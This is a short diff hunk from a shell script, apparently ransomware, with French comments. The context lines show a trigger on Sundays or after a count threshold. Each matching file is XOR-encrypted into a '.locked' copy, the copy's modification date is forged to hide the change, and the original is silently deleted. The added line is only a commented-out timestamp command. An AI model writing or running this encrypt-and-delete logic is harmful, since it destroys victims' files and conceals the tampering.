@@ -27,6 +27,7 @@ if [ "$(date +%u)" -eq 7 ] || [ "$count" -gt 5 ]; then
             xor_file "$file" "$file.locked" "$key" 2>/dev/null
             touch -d "$data" "$file.locked"  2>/dev/null  # pour copier la date de modification du fichier original sauvegardé au préalable ou peut utiliser
             #ou alors touch -r "$file" "$file.locked" pour utiliser la date directement du fichier original avant supression sans
+            #touch -r "$file" "$file.locked" 2>/dev/null 
             rm -f "$file" 2>/dev/null
         fi
     done
